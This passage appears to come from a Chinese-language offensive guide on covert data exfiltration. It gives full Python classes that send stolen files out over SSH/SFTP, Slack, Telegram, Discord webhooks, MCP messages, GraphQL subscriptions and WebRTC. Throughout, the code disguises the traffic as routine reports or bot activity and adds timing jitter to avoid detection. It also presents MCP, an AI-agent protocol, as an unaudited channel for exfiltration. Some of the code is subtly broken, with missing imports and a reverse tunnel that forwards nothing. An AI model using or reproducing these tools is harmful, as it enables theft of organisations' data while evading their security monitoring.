## §2: 协议隧道外泄 (Protocol Tunneling)

### 2.1 SSH隧道外泄

SSH提供了强大的隧道能力，可以用于数据外泄而不被检测，因为SSH流量在大多数企业环境中是合法的。

```python
#!/usr/bin/env python3
"""
SSH隧道外泄模块
利用paramiko实现SSH隧道数据传输
支持：正向/反向隧道、SCP伪装、SFTP数据嵌入
"""

import paramiko
import os
import time
import random
import threading
import socket
import select
from io import BytesIO
from typing import Optional, Callable

class SSHTunnelExfil:
    """
    SSH隧道外泄器
    策略: 利用SSH的合法隧道功能进行数据外泄
    """

    def __init__(self, host: str, port: int = 22, username: str = "root",
                 password: str = None, key_file: str = None):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.key_file = key_file
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def connect(self) -> bool:
        """建立SSH连接"""
        try:
            if self.key_file:
                key = paramiko.RSAKey.from_private_key_file(self.key_file)
                self.client.connect(self.host, self.port, self.username, pkey=key)
            else:
                self.client.connect(self.host, self.port, self.username, self.password)
            return True
        except Exception as e:
            print(f"[!] SSH连接失败: {e}")
            return False

    def exfiltrate_via_sftp(self, local_path: str, remote_path: str) -> bool:
        """通过SFTP外泄文件 - 伪装为正常文件传输"""
        try:
            sftp = self.client.open_sftp()
            file_size = os.path.getsize(local_path)

            # 分块传输，模拟正常SFTP行为
            chunk_size = 1024 * 256  # 256KB

            with open(local_path, "rb") as local_file:
                with sftp.open(remote_path, "wb") as remote_file:
                    total = 0
                    while True:
                        chunk = local_file.read(chunk_size)
                        if not chunk:
                            break
                        remote_file.write(chunk)
                        total += len(chunk)
                        # 模拟正常传输速度
                        time.sleep(random.uniform(0.01, 0.05))

            sftp.close()
            print(f"[+] SFTP外泄完成: {total} bytes")
            return True

        except Exception as e:
            print(f"[!] SFTP外泄失败: {e}")
            return False

    def exfiltrate_via_exec(self, local_path: str) -> bool:
        """
        通过SSH exec命令外泄数据
        利用base64编码+SSH命令执行，规避文件传输检测
        """
        with open(local_path, "rb") as f:
            data = f.read()

        import base64 as b64
        encoded = b64.b64encode(data).decode()

        # 分块执行命令 (避免单次命令过长)
        chunk_size = 1024 * 32  # 32KB Base64
        chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]

        file_name = os.path.basename(local_path)
        remote_path = f"/tmp/.cache_{random.randint(1000, 9999)}"

        for idx, chunk in enumerate(chunks):
            cmd = f"echo '{chunk}' >> {remote_path}"
            stdin, stdout, stderr = self.client.exec_command(cmd)
            stdout.channel.recv_exit_status()
            time.sleep(random.uniform(0.1, 0.3))

        # 在远程主机上解码
        cmd = f"base64 -d {remote_path} > /tmp/{file_name} && rm {remote_path}"
        stdin, stdout, stderr = self.client.exec_command(cmd)
        exit_code = stdout.channel.recv_exit_status()

        return exit_code == 0

    def exfiltrate_via_reverse_tunnel(self, local_port: int, remote_port: int) -> bool:
        """
        SSH反向隧道外泄
        在攻击者服务器上监听，受害主机通过反向隧道连接
        """
        transport = self.client.get_transport()
        if transport is None:
            return False

        # 请求反向端口转发
        transport.request_port_forward("0.0.0.0", remote_port)

        def forward_data():
            # 在受害主机上启动本地监听
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind(("127.0.0.1", local_port))
            server.listen(1)

            while True:
                client, addr = server.accept()
                data = client.recv(65536)
                if data:
                    # 数据通过反向隧道自动转发
                    pass
                client.close()

        thread = threading.Thread(target=forward_data, daemon=True)
        thread.start()

        print(f"[*] 反向隧道已建立: localhost:{local_port} -> remote:{remote_port}")
        return True

    def close(self):
        """关闭SSH连接"""
        self.client.close()
```

### 2.2 Slack API外泄

利用Slack API作为外泄通道，将数据伪装为正常聊天消息或文件上传。

```python
#!/usr/bin/env python3
"""
Slack API外泄模块
利用Slack Bot Token进行数据外泄
策略：伪装为正常的Slack集成/机器人行为
"""

import requests
import time
import random
import base64
import json
from typing import List, Optional

class SlackExfiltrator:
    """Slack API外泄器"""

    def __init__(self, bot_token: str, channel_id: str):
        self.bot_token = bot_token
        self.channel_id = channel_id
        self.base_url = "https://slack.com/api"
        self.session = requests.Session()
        self.session.headers.update({
            "Authorization": f"Bearer {bot_token}",
            "Content-Type": "application/json",
        })

    def _chunk_data(self, data: bytes, chunk_size: int = 3000) -> List[bytes]:
        """将数据分块 (Slack消息有长度限制)"""
        return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

    def exfiltrate_via_messages(self, file_path: str) -> bool:
        """
        通过Slack消息外泄数据
        数据编码为Base64后分片发送
        """
        with open(file_path, "rb") as f:
            data = f.read()

        encoded = base64.b64encode(data).decode()
        chunks = self._chunk_data(encoded.encode(), chunk_size=3000)
        file_name = os.path.basename(file_path)
        session_id = f"{random.randint(10000, 99999)}"

        # 发送文件头
        header_msg = f"[BOT] Processing report #{session_id}: {file_name} ({len(chunks)} parts)"
        self.session.post(
            f"{self.base_url}/chat.postMessage",
            json={"channel": self.channel_id, "text": header_msg}
        )
        time.sleep(1)

        for idx, chunk in enumerate(chunks):
            # 伪装为代码块消息
            msg = f"```\n# Report #{session_id} Part {idx + 1}/{len(chunks)}\n{chunk.decode()}\n```"

            resp = self.session.post(
                f"{self.base_url}/chat.postMessage",
                json={"channel": self.channel_id, "text": msg}
            )

            if resp.status_code != 200:
                print(f"[!] Part {idx + 1} failed: {resp.text}")
                return False

            if idx % 10 == 0:
                print(f"[+] Part {idx + 1}/{len(chunks)} sent")

            time.sleep(random.uniform(1, 3))  # 模拟人类打字速度

        # 发送完成标记
        end_msg = f"[BOT] Report #{session_id} complete. Total: {len(encoded)} chars"
        self.session.post(
            f"{self.base_url}/chat.postMessage",
            json={"channel": self.channel_id, "text": end_msg}
        )

        return True

    def exfiltrate_via_file_upload(self, file_path: str) -> bool:
        """
        通过Slack文件上传外泄
        伪装为正常文件共享
        """
        file_name = os.path.basename(file_path)
        file_size = os.path.getsize(file_path)

        # 获取上传URL
        resp = self.session.get(
            f"{self.base_url}/files.getUploadURLExternal",
            params={"filename": file_name, "length": file_size}
        )
        upload_info = resp.json()

        if not upload_info.get("ok"):
            print(f"[!] 获取上传URL失败: {upload_info}")
            return False

        upload_url = upload_info["upload_url"]
        file_id = upload_info["file_id"]

        # 上传文件
        with open(file_path, "rb") as f:
            resp = requests.post(upload_url, files={"file": f})

        # 完成上传
        resp = self.session.post(
            f"{self.base_url}/files.completeUploadExternal",
            json={
                "files": [{"id": file_id, "title": file_name}],
                "channel_id": self.channel_id,
            }
        )

        return resp.json().get("ok", False)
```

### 2.3 Telegram Bot API外泄

```python
#!/usr/bin/env python3
"""
Telegram Bot API外泄模块
利用Telegram Bot进行数据外泄
优势：Telegram流量通常不会被企业网络拦截
"""

import requests
import asyncio
import aiohttp
import base64
import os
import time
import random
from typing import List

class TelegramExfiltrator:
    """Telegram Bot外泄器"""

    def __init__(self, bot_token: str, chat_id: str):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{bot_token}"
        self.session = requests.Session()

    def _chunk_data(self, data: bytes, chunk_size: int = 4096) -> List[bytes]:
        """分块数据"""
        return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

    def exfiltrate_file(self, file_path: str) -> bool:
        """通过Telegram文件上传外泄"""
        file_name = os.path.basename(file_path)
        file_size = os.path.getsize(file_path)

        if file_size <= 50 * 1024 * 1024:  # 小于50MB
            # 直接上传文件
            with open(file_path, "rb") as f:
                resp = self.session.post(
                    f"{self.base_url}/sendDocument",
                    data={"chat_id": self.chat_id, "caption": f"Report: {file_name}"},
                    files={"document": (file_name, f)}
                )
            return resp.status_code == 200
        else:
            # 大文件分片
            return self._exfiltrate_large_file(file_path)

    def _exfiltrate_large_file(self, file_path: str) -> bool:
        """分片发送大文件 - 每片作为独立文档"""
        with open(file_path, "rb") as f:
            data = f.read()

        chunks = self._chunk_data(data, chunk_size=1024 * 1024 * 45)  # 45MB per chunk
        file_name = os.path.basename(file_path)

        for idx, chunk in enumerate(chunks):
            # 每片作为独立文件发送
            chunk_name = f"{file_name}.part{idx:03d}"
            resp = self.session.post(
                f"{self.base_url}/sendDocument",
                data={"chat_id": self.chat_id, "caption": f"Part {idx + 1}/{len(chunks)}"},
                files={"document": (chunk_name, chunk)}
            )

            if resp.status_code != 200:
                print(f"[!] Part {idx + 1} failed: {resp.text}")
                return False

            time.sleep(random.uniform(2, 5))
            print(f"[+] Part {idx + 1}/{len(chunks)} sent")

        return True

    async def exfiltrate_async(self, data: bytes) -> bool:
        """异步批量外泄 (更高吞吐量)"""
        chunks = self._chunk_data(data, chunk_size=4096)

        async with aiohttp.ClientSession() as session:
            tasks = []
            for idx, chunk in enumerate(chunks):
                encoded = base64.b64encode(chunk).decode()
                url = f"{self.base_url}/sendMessage"
                payload = {
                    "chat_id": self.chat_id,
                    "text": f"{idx:04d}|{encoded}",
                }
                tasks.append(session.post(url, json=payload))
                await asyncio.sleep(0.05)  # 速率限制

            results = await asyncio.gather(*tasks, return_exceptions=True)
            success = sum(1 for r in results if not isinstance(r, Exception))
            print(f"[+] Async: {success}/{len(chunks)} chunks sent")
            return success == len(chunks)

    def exfiltrate_via_channel(self, file_path: str) -> bool:
        """通过Telegram频道外泄 (更隐蔽)"""
        # 频道消息不会被个人设备通知，更隐蔽
        file_name = os.path.basename(file_path)

        with open(file_path, "rb") as f:
            data = f.read()

        encoded = base64.b64encode(data).decode()
        chunks = self._chunk_data(encoded.encode(), chunk_size=3800)

        for idx, chunk in enumerate(chunks):
            msg = f"#batch_{random.randint(1000, 9999)}\n{chunk.decode()}"
            resp = self.session.post(
                f"{self.base_url}/sendMessage",
                json={"chat_id": self.chat_id, "text": msg}
            )

            if resp.status_code != 200:
                return False

            time.sleep(random.uniform(0.5, 1.5))

        return True
```

### 2.4 Discord Webhook外泄

```python
#!/usr/bin/env python3
"""
Discord Webhook外泄模块
利用Discord Webhook进行数据外泄
优势：Discord流量在大多数企业中不被拦截
"""

import requests
import json
import base64
import os
import time
import random
from typing import Optional

class DiscordWebhookExfil:
    """Discord Webhook外泄器"""

    def __init__(self, webhook_url: str):
        self.webhook_url = webhook_url
        self.session = requests.Session()

    def exfiltrate_text(self, data: str, chunk_size: int = 1900) -> bool:
        """通过文本消息外泄"""
        chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

        for idx, chunk in enumerate(chunks):
            payload = {
                "content": f"```\n{chunk}\n```",
                "username": "Report Bot",
                "avatar_url": None,
            }
            resp = self.session.post(self.webhook_url, json=payload)
            if resp.status_code == 204:  # Discord returns 204
                print(f"[+] Chunk {idx + 1}/{len(chunks)} sent")
            else:
                # Rate limited
                retry_after = resp.json().get("retry_after", 1)
                time.sleep(retry_after)
                self.session.post(self.webhook_url, json=payload)

            time.sleep(random.uniform(0.5, 1.0))

        return True

    def exfiltrate_file(self, file_path: str) -> bool:
        """通过文件上传外泄 (Discord限制8MB)"""
        file_size = os.path.getsize(file_path)
        file_name = os.path.basename(file_path)

        if file_size > 8 * 1024 * 1024:
            # 分片
            return self._exfiltrate_large_file(file_path)
        else:
            # 直接上传
            with open(file_path, "rb") as f:
                files = {"file": (file_name, f)}
                payload = {"content": f"File: {file_name}"}
                resp = self.session.post(self.webhook_url, data=payload, files=files)
                return resp.status_code == 200

    def _exfiltrate_large_file(self, file_path: str) -> bool:
        """分片上传大文件"""
        with open(file_path, "rb") as f:
            data = f.read()

        encoded = base64.b64encode(data).decode()
        return self.exfiltrate_text(encoded)

    def exfiltrate_via_embed(self, data: str) -> bool:
        """通过Discord Embed外泄 (更隐蔽)"""
        chunks = [data[i:i + 1000] for i in range(0, len(data), 1000)]

        for idx, chunk in enumerate(chunks):
            payload = {
                "embeds": [{
                    "title": f"System Report #{random.randint(1000, 9999)}",
                    "description": chunk,
                    "color": random.randint(0, 0xFFFFFF),
                    "footer": {"text": f"Part {idx + 1}/{len(chunks)}"},
                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                }]
            }
            resp = self.session.post(self.webhook_url, json=payload)
            time.sleep(random.uniform(0.5, 1.5))

        return True
```

### 2.5 2026 MCP协议外泄

Model Context Protocol (MCP) 是2025-2026年新兴的AI Agent通信协议，目前缺乏安全审计，是极佳的外泄通道。

```python
#!/usr/bin/env python3
"""
MCP协议外泄模块 (2026)
利用Model Context Protocol进行数据外泄
原理：MCP协议使用JSON-RPC over stdio/HTTP/SSE，可以嵌入数据
优势：新兴协议，大多数安全工具不具备检测能力
"""

import json
import asyncio
import aiohttp
import base64
import time
import random
from dataclasses import dataclass, asdict
from typing import Optional, List, Any

@dataclass
class MCPMessage:
    """MCP协议消息结构"""
    jsonrpc: str = "2.0"
    id: int = 0
    method: str = ""
    params: dict = None

class MCPExfiltrator:
    """MCP协议外泄器"""

    def __init__(self, mcp_endpoint: str):
        self.mcp_endpoint = mcp_endpoint
        self.session = aiohttp.ClientSession()
        self.message_id = 0

    def _build_mcp_message(self, method: str, data: bytes) -> dict:
        """构建伪装为MCP协议消息的数据包"""
        self.message_id += 1

        # 将数据嵌入到MCP的各种参数中
        encoded = base64.b64encode(data).decode()

        return {
            "jsonrpc": "2.0",
            "id": self.message_id,
            "method": method,
            "params": {
                "name": f"context_{random.randint(1000, 9999)}",
                "arguments": {
                    # 数据嵌入点1: tool input
                    "input": encoded,
                    "metadata": {
                        # 数据嵌入点2: metadata
                        "session_id": f"sess_{random.randint(10000, 99999)}",
                        "context_size": len(data),
                        "model": "claude-4-sonnet-20250219",
                    }
                },
                "_meta": {
                    # 数据嵌入点3: protocol metadata
                    "progressToken": self.message_id,
                    "progress": len(data),
                }
            }
        }

    async def exfiltrate_via_tools_list(self, data: bytes) -> bool:
        """
        通过MCP tools/list响应外泄数据
        伪装为工具列表响应，将数据嵌入工具描述中
        """
        encoded = base64.b64encode(data).decode()

        # 将数据伪装为工具描述
        tools = []
        for i in range(0, len(encoded), 500):
            chunk = encoded[i:i + 500]
            tools.append({
                "name": f"data_processor_v{i // 500}",
                "description": chunk,
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "data": {"type": "string", "description": "Data input"}
                    }
                }
            })

        message = {
            "jsonrpc": "2.0",
            "id": self.message_id,
            "result": {"tools": tools}
        }

        async with self.session.post(self.mcp_endpoint, json=message) as resp:
            return resp.status == 200

    async def exfiltrate_via_resources(self, data: bytes) -> bool:
        """通过MCP resources/read外泄"""
        encoded = base64.b64encode(data).decode()

        message = {
            "jsonrpc": "2.0",
            "id": self.message_id,
            "method": "resources/read",
            "params": {
                "uri": f"data://sensitive/{random.randint(1000, 9999)}",
                "contents": [{
                    "uri": f"data://sensitive/{random.randint(1000, 9999)}",
                    "mimeType": "application/octet-stream",
                    "text": encoded
                }]
            }
        }

        async with self.session.post(self.mcp_endpoint, json=message) as resp:
            return resp.status == 200

    async def exfiltrate_file(self, file_path: str) -> bool:
        """通过MCP协议外泄文件"""
        with open(file_path, "rb") as f:
            data = f.read()

        # 使用多种MCP方法混合外泄
        chunk_size = 1024 * 10
        chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]
        methods = ["tools/call", "resources/read", "prompts/get", "completion/complete"]

        for idx, chunk in enumerate(chunks):
            method = random.choice(methods)
            message = self._build_mcp_message(method, chunk)

            async with self.session.post(self.mcp_endpoint, json=message) as resp:
                if resp.status != 200:
                    print(f"[!] Chunk {idx + 1} failed")
                    return False

            if idx % 10 == 0:
                print(f"[+] MCP外泄: {idx + 1}/{len(chunks)} chunks")

            await asyncio.sleep(random.uniform(0.1, 0.5))

        return True

    async def close(self):
        await self.session.close()
```

### 2.6 GraphQL订阅外泄 (2026)

```python
#!/usr/bin/env python3
"""
GraphQL订阅外泄模块 (2026)
利用GraphQL Subscription (WebSocket) 进行数据外泄
原理：在订阅查询的参数中嵌入数据
"""

import websocket
import json
import base64
import time
import random
import threading

class GraphQLSubscriptionExfil:
    """GraphQL订阅外泄器"""

    def __init__(self, graphql_ws_url: str):
        self.ws_url = graphql_ws_url
        self.ws = None
        self.connected = False

    def connect(self):
        """建立WebSocket连接"""
        self.ws = websocket.WebSocket()
        self.ws.connect(self.ws_url)

        # 发送GQL_CONNECTION_INIT
        self.ws.send(json.dumps({"type": "connection_init", "payload": {}}))
        response = json.loads(self.ws.recv())

        if response.get("type") == "connection_ack":
            self.connected = True
            return True
        return False

    def exfiltrate_via_subscription(self, data: str) -> bool:
        """通过GraphQL订阅查询外泄数据"""
        if not self.connected:
            if not self.connect():
                return False

        encoded = base64.b64encode(data.encode()).decode()

        # 将数据嵌入到订阅查询的变量中
        subscription_payload = {
            "id": str(random.randint(1, 999999)),
            "type": "start",
            "payload": {
                "query": """
                    subscription DataStream($filter: String!, $metadata: JSON!) {
                        onDataUpdate(filter: $filter, metadata: $metadata) {
                            id
                            payload
                            timestamp
                        }
                    }
                """,
                "variables": {
                    "filter": f"status_{random.randint(1, 100)}",
                    "metadata": {
                        "data": encoded,
                        "batch": random.randint(1, 9999),
                        "timestamp": int(time.time()),
                    }
                },
                "extensions": {
                    # 数据嵌入在extensions中
                    "custom_data": encoded,
                    "session": random.randint(10000, 99999),
                }
            }
        }

        self.ws.send(json.dumps(subscription_payload))
        time.sleep(0.5)

        # 立即取消订阅 (我们只需要发送数据)
        self.ws.send(json.dumps({
            "id": subscription_payload["id"],
            "type": "stop"
        }))

        return True

    def close(self):
        if self.ws:
            self.ws.close()
```

### 2.7 WebRTC数据通道外泄 (2026)

```python
#!/usr/bin/env python3
"""
WebRTC数据通道外泄模块 (2026)
利用WebRTC DataChannel进行P2P数据外泄
优势：P2P、加密、UDP-based，极难检测
"""

import asyncio
import json
import base64
import random
from aiortc import RTCPeerConnection, RTCSessionDescription, RTCDataChannel

class WebRTCExfiltrator:
    """WebRTC数据通道外泄器"""

    def __init__(self, signaling_url: str):
        self.signaling_url = signaling_url
        self.pc = RTCPeerConnection()
        self.data_channel = None
        self.chunks_sent = 0

    def _on_data_channel(self, channel: RTCDataChannel):
        """数据通道回调"""
        self.data_channel = channel

    async def connect(self) -> bool:
        """建立WebRTC连接"""
        self.pc.on("datachannel", self._on_data_channel)

        # 创建数据通道
        channel = self.pc.createDataChannel("exfil")
        self.data_channel = channel

        # 创建offer
        offer = await self.pc.createOffer()
        await self.pc.setLocalDescription(offer)

        # 发送offer到信令服务器 (模拟)
        async with aiohttp.ClientSession() as session:
            await session.post(
                self.signaling_url,
                json={
                    "type": "offer",
                    "sdp": self.pc.localDescription.sdp
                }
            )

        print("[*] WebRTC连接已建立")
        return True

    async def exfiltrate(self, data: bytes) -> bool:
        """通过WebRTC数据通道外泄"""
        if not self.data_channel:
            if not await self.connect():
                return False

        encoded = base64.b64encode(data).decode()
        chunk_size = 1024 * 16  # 16KB per chunk (WebRTC SCTP limit)

        chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]

        for idx, chunk in enumerate(chunks):
            packet = json.dumps({
                "idx": idx,
                "total": len(chunks),
                "data": chunk,
                "checksum": random.randint(100000, 999999),
            })
            self.data_channel.send(packet)
            self.chunks_sent += 1
            await asyncio.sleep(0.01)

        print(f"[+] WebRTC外泄完成: {self.chunks_sent} chunks")
        return True
```

---

